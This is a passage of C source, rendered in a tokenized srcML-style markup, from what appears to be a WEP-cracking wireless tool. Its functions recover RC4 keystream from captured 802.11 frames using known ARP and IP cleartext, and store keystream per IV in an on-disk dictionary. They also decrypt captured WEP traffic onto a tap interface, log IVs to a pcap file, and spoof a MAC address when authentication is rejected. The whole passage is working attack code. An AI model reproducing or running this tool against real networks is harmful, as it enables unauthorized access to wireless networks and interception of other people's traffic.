expr_stmt|;
name|fd
operator|=
name|open
argument_list|(
name|path
argument_list|,
name|O_RDONLY
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|==
operator|-
literal|1
condition|)
block|{
if|if
condition|(
name|errno
operator|!=
name|ENOENT
condition|)
block|{
name|perror
argument_list|(
literal|"open()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|mkdir
argument_list|(
name|path
argument_list|,
literal|0755
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"mkdir()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
block|}
else|else
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
block|}
comment|// last byte
name|strcat
argument_list|(
name|path
argument_list|,
literal|"/"
argument_list|)
expr_stmt|;
name|strcat
argument_list|(
name|path
argument_list|,
name|paths
index|[
literal|2
index|]
argument_list|)
expr_stmt|;
name|fd
operator|=
name|open
argument_list|(
name|path
argument_list|,
name|O_RDWR
argument_list|)
expr_stmt|;
comment|// already exists... see if we are consistent...
if|if
condition|(
name|fd
operator|!=
operator|-
literal|1
condition|)
block|{
name|rd
operator|=
name|read
argument_list|(
name|fd
argument_list|,
name|file_clear
argument_list|,
sizeof|sizeof
argument_list|(
name|file_clear
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"read()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// check consistency....
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
name|rd
condition|;
name|i
operator|++
control|)
block|{
if|if
condition|(
name|file_clear
index|[
name|i
index|]
operator|!=
operator|(
name|data
index|[
name|i
index|]
operator|^
name|inet_clear
index|[
name|i
index|]
operator|)
condition|)
block|{
name|printf
argument_list|(
literal|"Mismatch in byte %d for:\n"
argument_list|,
name|i
argument_list|)
expr_stmt|;
name|hexdump
argument_list|(
name|body
argument_list|,
name|len
operator|+
literal|4
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
block|}
comment|// no need to log
if|if
condition|(
name|i
operator|>=
sizeof|sizeof
argument_list|(
name|inet_clear
argument_list|)
condition|)
block|{
if|#
directive|if
literal|0
block|time_print("Not logging IV %.2X:%.2X:%.2X cuz we got it\n", 				body[0], body[1], body[2]);
endif|#
directive|endif
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
return|return;
block|}
comment|// file has less... fd still open
block|}
else|else
block|{
name|fd
operator|=
name|open
argument_list|(
name|path
argument_list|,
name|O_WRONLY
operator||
name|O_CREAT
argument_list|,
literal|0644
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|==
operator|-
literal|1
condition|)
block|{
name|printf
argument_list|(
literal|"Can't open (%s): %s\n"
argument_list|,
name|path
argument_list|,
name|strerror
argument_list|(
name|errno
argument_list|)
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
block|}
name|assert
argument_list|(
sizeof|sizeof
argument_list|(
name|file_clear
argument_list|)
operator|>=
sizeof|sizeof
argument_list|(
name|inet_clear
argument_list|)
argument_list|)
expr_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
name|len
condition|;
name|i
operator|++
control|)
name|file_clear
index|[
name|i
index|]
operator|=
name|data
index|[
name|i
index|]
operator|^
name|inet_clear
index|[
name|i
index|]
expr_stmt|;
name|rd
operator|=
name|write
argument_list|(
name|fd
argument_list|,
name|file_clear
argument_list|,
name|len
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"write()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|rd
operator|!=
name|len
condition|)
block|{
name|printf
argument_list|(
literal|"Wrote %d of %d\n"
argument_list|,
name|rd
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|stuff_for_us
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|int
name|type
decl_stmt|,
name|stype
decl_stmt|;
name|unsigned
name|char
modifier|*
name|body
decl_stmt|;
name|type
operator|=
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator|&
name|IEEE80211_FC0_TYPE_MASK
expr_stmt|;
name|stype
operator|=
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator|&
name|IEEE80211_FC0_SUBTYPE_MASK
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
comment|// CTL
if|if
condition|(
name|type
operator|==
name|IEEE80211_FC0_TYPE_CTL
condition|)
block|{
if|if
condition|(
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_ACK
condition|)
block|{
name|txstate
operator|.
name|waiting_ack
operator|=
literal|0
expr_stmt|;
return|return;
block|}
if|if
condition|(
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_RTS
condition|)
block|{
return|return;
block|}
if|if
condition|(
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_CTS
condition|)
block|{
return|return;
block|}
name|time_print
argument_list|(
literal|"got CTL=%x\n"
argument_list|,
name|stype
argument_list|)
expr_stmt|;
return|return;
block|}
comment|// MGM
if|if
condition|(
name|type
operator|==
name|IEEE80211_FC0_TYPE_MGT
condition|)
block|{
if|if
condition|(
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_DEAUTH
condition|)
block|{
name|unsigned
name|short
modifier|*
name|rc
init|=
operator|(
name|unsigned
name|short
operator|*
operator|)
name|body
decl_stmt|;
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Got deauth=%u\n"
argument_list|,
name|le16toh
argument_list|(
operator|*
name|rc
argument_list|)
argument_list|)
expr_stmt|;
name|state
operator|=
name|FOUND_VICTIM
expr_stmt|;
return|return;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
elseif|else
if|if
condition|(
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_AUTH
condition|)
block|{
name|unsigned
name|short
modifier|*
name|sc
init|=
operator|(
name|unsigned
name|short
operator|*
operator|)
name|body
decl_stmt|;
if|if
condition|(
operator|*
name|sc
operator|!=
literal|0
condition|)
block|{
name|time_print
argument_list|(
literal|"Warning got auth algo=%x\n"
argument_list|,
operator|*
name|sc
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
return|return;
block|}
name|sc
operator|++
expr_stmt|;
if|if
condition|(
operator|*
name|sc
operator|!=
literal|2
condition|)
block|{
name|time_print
argument_list|(
literal|"Warning got auth seq=%x\n"
argument_list|,
operator|*
name|sc
argument_list|)
expr_stmt|;
return|return;
block|}
name|sc
operator|++
expr_stmt|;
if|if
condition|(
operator|*
name|sc
operator|==
literal|1
condition|)
block|{
name|time_print
argument_list|(
literal|"Auth rejected... trying to spoof mac.\n"
argument_list|)
expr_stmt|;
name|state
operator|=
name|SPOOF_MAC
expr_stmt|;
return|return;
block|}
elseif|else
if|if
condition|(
operator|*
name|sc
operator|==
literal|0
condition|)
block|{
name|time_print
argument_list|(
literal|"Authenticated\n"
argument_list|)
expr_stmt|;
name|state
operator|=
name|GOT_AUTH
expr_stmt|;
return|return;
block|}
else|else
block|{
name|time_print
argument_list|(
literal|"Got auth %x\n"
argument_list|,
operator|*
name|sc
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
block|}
elseif|else
if|if
condition|(
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_ASSOC_RESP
condition|)
block|{
name|unsigned
name|short
modifier|*
name|sc
init|=
operator|(
name|unsigned
name|short
operator|*
operator|)
name|body
decl_stmt|;
name|sc
operator|++
expr_stmt|;
comment|// cap
if|if
condition|(
operator|*
name|sc
operator|==
literal|0
condition|)
block|{
name|sc
operator|++
expr_stmt|;
name|unsigned
name|int
name|aid
init|=
name|le16toh
argument_list|(
operator|*
name|sc
argument_list|)
operator|&
literal|0x3FFF
decl_stmt|;
name|time_print
argument_list|(
literal|"Associated (ID=%x)\n"
argument_list|,
name|aid
argument_list|)
expr_stmt|;
name|state
operator|=
name|GOT_ASSOC
expr_stmt|;
return|return;
block|}
elseif|else
if|if
condition|(
operator|*
name|sc
operator|==
literal|12
condition|)
block|{
name|time_print
argument_list|(
literal|"Assoc rejected..."
literal|" trying to spoof mac.\n"
argument_list|)
expr_stmt|;
name|state
operator|=
name|SPOOF_MAC
expr_stmt|;
return|return;
block|}
else|else
block|{
name|time_print
argument_list|(
literal|"got assoc %x\n"
argument_list|,
operator|*
name|sc
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
block|}
elseif|else
if|if
condition|(
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_PROBE_RESP
condition|)
block|{
return|return;
block|}
name|time_print
argument_list|(
literal|"\nGOT MAN=%x\n"
argument_list|,
name|stype
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|type
operator|==
name|IEEE80211_FC0_TYPE_DATA
operator|&&
name|stype
operator|==
name|IEEE80211_FC0_SUBTYPE_DATA
condition|)
block|{
name|int
name|dlen
decl_stmt|;
name|dlen
operator|=
name|len
operator|-
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|-
literal|4
operator|-
literal|4
expr_stmt|;
if|if
condition|(
operator|!
operator|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_WEP
operator|)
condition|)
block|{
name|time_print
argument_list|(
literal|"WARNING: Got NON wep packet from %s dlen %d stype=%x\n"
argument_list|,
name|mac2str
argument_list|(
name|wh
operator|->
name|i_addr2
argument_list|)
argument_list|,
name|dlen
argument_list|,
name|stype
argument_list|)
expr_stmt|;
return|return;
block|}
name|assert
argument_list|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_WEP
argument_list|)
expr_stmt|;
if|if
condition|(
operator|(
name|dlen
operator|==
literal|36
operator|||
name|dlen
operator|==
name|PADDED_ARPLEN
operator|)
operator|&&
name|rtrmac
operator|==
operator|(
name|unsigned
name|char
operator|*
operator|)
literal|1
condition|)
block|{
name|rtrmac
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|malloc
argument_list|(
literal|6
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|rtrmac
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|assert
argument_list|(
name|rtrmac
operator|>
operator|(
name|unsigned
name|char
operator|*
operator|)
literal|1
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|rtrmac
argument_list|,
name|wh
operator|->
name|i_addr3
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Got arp reply from (%s)\n"
argument_list|,
name|mac2str
argument_list|(
name|rtrmac
argument_list|)
argument_list|)
expr_stmt|;
return|return;
block|}
if|#
directive|if
literal|0
comment|// check if its a TTL update from dictionary stuff
block|if (dlen>= (8+20+8+MAGIC_TTL_PAD)&&  		    dlen<= (8+20+8+MAGIC_TTL_PAD+128)) { 			int ttl_delta, new_ttl; 			 			ttl_delta = dlen - 8 - 20 - 8 - MAGIC_TTL_PAD; 			new_ttl = 128 - ttl_delta;  			if (ttl_val&& new_ttl != ttl_val) { 				time_print("oops. ttl changed from %d to %d\n", 					   ttl_val, new_ttl); 				exit(1);	    			}  			if (!ttl_val) { 				ttl_val = new_ttl; 				printf("\n"); 				time_print("Got TTL of %d\n", ttl_val); 				calculate_inet_clear(); 			} 		}
comment|// check if its dictionary data
block|if (ttl_val&& dlen == (8+20+8+PRGA_LEN)) { 			log_dictionary(body, len - sizeof(*wh)); 		}
endif|#
directive|endif
block|}
if|#
directive|if
literal|0
block|printf ("Got frame for us (type=%x stype=%x) from=(%s) len=%d\n", 		type, stype, mac2str(wh->i_addr2), len);
endif|#
directive|endif
block|}
end_function

begin_function
name|void
name|decrypt_arpreq
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|rd
parameter_list|)
block|{
name|unsigned
name|char
modifier|*
name|body
decl_stmt|;
name|int
name|bodylen
decl_stmt|;
name|unsigned
name|char
name|clear
index|[
literal|36
index|]
decl_stmt|;
name|unsigned
name|char
modifier|*
name|ptr
decl_stmt|;
name|struct
name|arphdr
modifier|*
name|h
decl_stmt|;
name|int
name|i
decl_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|clear
expr_stmt|;
comment|// calculate clear-text
name|memcpy
argument_list|(
name|ptr
argument_list|,
name|arp_clear
argument_list|,
sizeof|sizeof
argument_list|(
name|arp_clear
argument_list|)
operator|-
literal|1
argument_list|)
expr_stmt|;
name|ptr
operator|+=
sizeof|sizeof
argument_list|(
name|arp_clear
argument_list|)
operator|-
literal|1
expr_stmt|;
name|h
operator|=
operator|(
expr|struct
name|arphdr
operator|*
operator|)
name|ptr
expr_stmt|;
name|h
operator|->
name|ar_hrd
operator|=
name|htons
argument_list|(
name|ARPHRD_ETHER
argument_list|)
expr_stmt|;
name|h
operator|->
name|ar_pro
operator|=
name|htons
argument_list|(
name|ETHERTYPE_IP
argument_list|)
expr_stmt|;
name|h
operator|->
name|ar_hln
operator|=
literal|6
expr_stmt|;
name|h
operator|->
name|ar_pln
operator|=
literal|4
expr_stmt|;
name|h
operator|->
name|ar_op
operator|=
name|htons
argument_list|(
name|ARPOP_REQUEST
argument_list|)
expr_stmt|;
name|ptr
operator|+=
sizeof|sizeof
argument_list|(
operator|*
name|h
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|ptr
argument_list|,
name|wh
operator|->
name|i_addr3
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|bodylen
operator|=
name|rd
operator|-
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|-
literal|4
operator|-
literal|4
expr_stmt|;
name|decryptstate
operator|.
name|clen
operator|=
name|bodylen
expr_stmt|;
name|decryptstate
operator|.
name|cipher
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|malloc
argument_list|(
name|decryptstate
operator|.
name|clen
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|decryptstate
operator|.
name|cipher
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|malloc
argument_list|(
name|decryptstate
operator|.
name|clen
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|memcpy
argument_list|(
name|decryptstate
operator|.
name|cipher
argument_list|,
operator|&
name|body
index|[
literal|4
index|]
argument_list|,
name|decryptstate
operator|.
name|clen
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|decryptstate
operator|.
name|prgainfo
operator|.
name|iv
argument_list|,
name|body
argument_list|,
literal|3
argument_list|)
expr_stmt|;
name|memset
argument_list|(
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
argument_list|,
literal|0
argument_list|,
name|decryptstate
operator|.
name|clen
argument_list|)
expr_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
operator|(
literal|8
operator|+
literal|8
operator|+
literal|6
operator|)
condition|;
name|i
operator|++
control|)
block|{
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
index|[
name|i
index|]
operator|=
name|decryptstate
operator|.
name|cipher
index|[
name|i
index|]
operator|^
name|clear
index|[
name|i
index|]
expr_stmt|;
block|}
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|=
name|i
expr_stmt|;
name|time_print
argument_list|(
literal|"Got ARP request from (%s)\n"
argument_list|,
name|mac2str
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|)
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|log_wep
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|int
name|rd
decl_stmt|;
name|struct
name|pcap_pkthdr
name|pkh
decl_stmt|;
name|struct
name|timeval
name|tv
decl_stmt|;
name|unsigned
name|char
modifier|*
name|body
init|=
operator|(
name|unsigned
name|char
operator|*
operator|)
operator|(
name|wh
operator|+
literal|1
operator|)
decl_stmt|;
name|memset
argument_list|(
operator|&
name|pkh
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|pkh
argument_list|)
argument_list|)
expr_stmt|;
name|pkh
operator|.
name|caplen
operator|=
name|pkh
operator|.
name|len
operator|=
name|len
expr_stmt|;
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|tv
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|pkh
operator|.
name|ts
operator|=
name|tv
expr_stmt|;
if|if
condition|(
name|write
argument_list|(
name|weplog
operator|.
name|fd
argument_list|,
operator|&
name|pkh
argument_list|,
sizeof|sizeof
argument_list|(
name|pkh
argument_list|)
argument_list|)
operator|!=
sizeof|sizeof
argument_list|(
name|pkh
argument_list|)
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"write()"
argument_list|)
expr_stmt|;
name|rd
operator|=
name|write
argument_list|(
name|weplog
operator|.
name|fd
argument_list|,
name|wh
argument_list|,
name|len
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"write()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|rd
operator|!=
name|len
condition|)
block|{
name|time_print
argument_list|(
literal|"short write %d out of %d\n"
argument_list|,
name|rd
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|#
directive|if
literal|0
block|if (fsync(weplog.fd) == -1) { 		perror("fsync()"); 		exit(1); 	}
endif|#
directive|endif
name|memcpy
argument_list|(
name|weplog
operator|.
name|iv
argument_list|,
name|body
argument_list|,
literal|3
argument_list|)
expr_stmt|;
name|weplog
operator|.
name|packets
operator|++
expr_stmt|;
block|}
end_function

begin_function
name|void
name|try_dictionary
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|unsigned
name|char
modifier|*
name|body
decl_stmt|;
name|char
name|path
index|[
literal|52
index|]
decl_stmt|;
name|char
name|paths
index|[
literal|3
index|]
index|[
literal|3
index|]
decl_stmt|;
name|int
name|i
decl_stmt|;
name|int
name|fd
decl_stmt|,
name|rd
decl_stmt|;
name|unsigned
name|char
name|packet
index|[
literal|4096
index|]
decl_stmt|;
name|int
name|dlen
decl_stmt|;
name|struct
name|ether_header
modifier|*
name|eh
decl_stmt|;
name|uLong
name|crc
decl_stmt|;
name|unsigned
name|long
modifier|*
name|pcrc
decl_stmt|;
name|unsigned
name|char
modifier|*
name|dmac
decl_stmt|,
modifier|*
name|smac
decl_stmt|;
name|assert
argument_list|(
name|len
operator|<
sizeof|sizeof
argument_list|(
name|packet
argument_list|)
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|eh
argument_list|)
argument_list|)
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
literal|3
condition|;
name|i
operator|++
control|)
name|snprintf
argument_list|(
name|paths
index|[
name|i
index|]
argument_list|,
sizeof|sizeof
argument_list|(
name|paths
index|[
name|i
index|]
argument_list|)
argument_list|,
literal|"%.2X"
argument_list|,
name|body
index|[
name|i
index|]
argument_list|)
expr_stmt|;
name|sprintf
argument_list|(
name|path
argument_list|,
literal|"%s/%s/%s/%s"
argument_list|,
name|DICT_PATH
argument_list|,
name|paths
index|[
literal|0
index|]
argument_list|,
name|paths
index|[
literal|1
index|]
argument_list|,
name|paths
index|[
literal|2
index|]
argument_list|)
expr_stmt|;
name|fd
operator|=
name|open
argument_list|(
name|path
argument_list|,
name|O_RDONLY
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|==
operator|-
literal|1
condition|)
return|return;
name|rd
operator|=
name|read
argument_list|(
name|fd
argument_list|,
operator|&
name|packet
index|[
literal|6
index|]
argument_list|,
sizeof|sizeof
argument_list|(
name|packet
argument_list|)
operator|-
literal|6
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"read()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
name|dlen
operator|=
name|len
operator|-
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|-
literal|4
expr_stmt|;
if|if
condition|(
name|dlen
operator|>
name|rd
condition|)
block|{
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Had PRGA (%s) but too little (%d/%d)\n"
argument_list|,
name|path
argument_list|,
name|rd
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
return|return;
block|}
name|body
operator|+=
literal|4
expr_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
name|dlen
condition|;
name|i
operator|++
control|)
name|packet
index|[
literal|6
operator|+
name|i
index|]
operator|^=
name|body
index|[
name|i
index|]
expr_stmt|;
name|dlen
operator|-=
literal|4
expr_stmt|;
name|crc
operator|=
name|crc32
argument_list|(
literal|0L
argument_list|,
name|Z_NULL
argument_list|,
literal|0
argument_list|)
expr_stmt|;
name|crc
operator|=
name|crc32
argument_list|(
name|crc
argument_list|,
operator|&
name|packet
index|[
literal|6
index|]
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
name|pcrc
operator|=
operator|(
name|unsigned
name|long
operator|*
operator|)
operator|(
operator|&
name|packet
index|[
literal|6
operator|+
name|dlen
index|]
operator|)
expr_stmt|;
if|if
condition|(
operator|*
name|pcrc
operator|!=
name|crc
condition|)
block|{
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"HAD PRGA (%s) checksum mismatch! (%x %x)\n"
argument_list|,
name|path
argument_list|,
operator|*
name|pcrc
argument_list|,
name|crc
argument_list|)
expr_stmt|;
return|return;
block|}
comment|// fill ethernet header
name|eh
operator|=
operator|(
expr|struct
name|ether_header
operator|*
operator|)
name|packet
expr_stmt|;
if|if
condition|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
condition|)
name|smac
operator|=
name|wh
operator|->
name|i_addr3
expr_stmt|;
else|else
name|smac
operator|=
name|wh
operator|->
name|i_addr2
expr_stmt|;
if|if
condition|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_TODS
condition|)
name|dmac
operator|=
name|wh
operator|->
name|i_addr3
expr_stmt|;
else|else
name|dmac
operator|=
name|wh
operator|->
name|i_addr1
expr_stmt|;
name|memcpy
argument_list|(
name|eh
operator|->
name|ether_dhost
argument_list|,
name|dmac
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|eh
operator|->
name|ether_shost
argument_list|,
name|smac
argument_list|,
literal|6
argument_list|)
expr_stmt|;
comment|// ether type should be there from llc
name|dlen
operator|-=
literal|8
expr_stmt|;
comment|// llc
name|dlen
operator|+=
sizeof|sizeof
argument_list|(
operator|*
name|eh
argument_list|)
expr_stmt|;
if|#
directive|if
literal|0
block|printf("\n"); 	time_print("Decrypted packet [%d bytes]!!! w00t\n", dlen); 	hexdump(packet, dlen);
endif|#
directive|endif
name|rd
operator|=
name|write
argument_list|(
name|tapfd
argument_list|,
name|packet
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"write()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|rd
operator|!=
name|dlen
condition|)
block|{
name|printf
argument_list|(
literal|"Wrote %d / %d\n"
argument_list|,
name|rd
argument_list|,
name|dlen
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
block|}
end_function

begin_function
name|int
name|is_arp
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|int
name|arpsize
init|=
literal|8
operator|+
sizeof|sizeof
argument_list|(
expr|struct
name|arphdr
argument_list|)
operator|+
literal|10
operator|*
literal|2
decl_stmt|;
if|if
condition|(
name|len
operator|==
name|arpsize
operator|||
name|len
operator|==
literal|54
condition|)
return|return
literal|1
return|;
return|return
literal|0
return|;
block|}
end_function

begin_function
name|void
modifier|*
name|get_sa
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|)
block|{
if|if
condition|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
condition|)
return|return
name|wh
operator|->
name|i_addr3
return|;
else|else
return|return
name|wh
operator|->
name|i_addr2
return|;
block|}
end_function

begin_function
name|void
modifier|*
name|get_da
parameter_list|(
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|)
block|{
if|if
condition|(
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator|&
name|IEEE80211_FC1_DIR_FROMDS
condition|)
return|return
name|wh
operator|->
name|i_addr1
return|;
else|else
return|return
name|wh
operator|->
name|i_addr3
return|;
block|}
end_function

begin_function
name|int
name|known_clear
parameter_list|(
name|void
modifier|*
name|clear
parameter_list|,
name|struct
name|ieee80211_frame
modifier|*
name|wh
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|unsigned
name|char
modifier|*
name|ptr
init|=
name|clear
decl_stmt|;
comment|/* IP */
if|if
condition|(
operator|!
name|is_arp
argument_list|(
name|wh
argument_list|,
name|len
argument_list|)
condition|)
block|{
name|unsigned
name|short
name|iplen
init|=
name|htons
argument_list|(
name|len
operator|-
literal|8
argument_list|)
decl_stmt|;
comment|//                printf("Assuming IP %d\n", len);
name|len
operator|=
sizeof|sizeof
argument_list|(
name|S_LLC_SNAP_IP
argument_list|)
operator|-
literal|1
expr_stmt|;
name|memcpy
argument_list|(
name|ptr
argument_list|,
name|S_LLC_SNAP_IP
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|ptr
operator|+=
name|len
expr_stmt|;
if|#
directive|if
literal|1
name|len
operator|=
literal|2
expr_stmt|;
name|memcpy
argument_list|(
name|ptr
argument_list|,
literal|"\x45\x00"
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|ptr
operator|+=
name|len
expr_stmt|;
name|memcpy
argument_list|(
name|ptr
argument_list|,
operator|&
name|iplen
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|ptr
operator|+=
name|len
expr_stmt|;
endif|#
directive|endif
name|len
operator|=
name|ptr
operator|-
operator|(
operator|(
name|unsigned
name|char
operator|*
operator|)
name|clear
operator|)
expr_stmt|;
return|return
name|len
return|;
block|}
comment|//        printf("Assuming ARP %d\n", len);
comment|/* arp */
name|len
operator|=
sizeof|sizeof
argument_list|(
name|S_LLC_SNAP_ARP
argument_list|)
operator|-
literal|1
expr_stmt|;
name|memcpy
argument_list|(
name|ptr
argument_list|,
name|S_LLC_SNAP_ARP
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|ptr
operator|+=
name|len
expr_stmt|;
comment|/* arp hdr */
name|len
operator|=
literal|6
expr_stmt|;
name|memcpy
argument_list|(
name|ptr
argument_list|,
literal|"\x00\x01\x08\x00\x06\x04"
argument_list|,
name|len
argument_list|)
expr_stmt|;
name|ptr
operator|+=
name|len
expr_stmt|;
comment|/* type of arp */
name|len
operator|=
literal|2
expr_stmt|;
if|if
condition|(
name|memcmp
argument_list|(
name|get_da
argument_list|(
name|wh
argument_list|)
argument_list|,
literal|"\xff\xff\xff\xff\xff\xff"
argument_list|,
literal|6
argument_list|)
operator|==
literal|0
condition|)
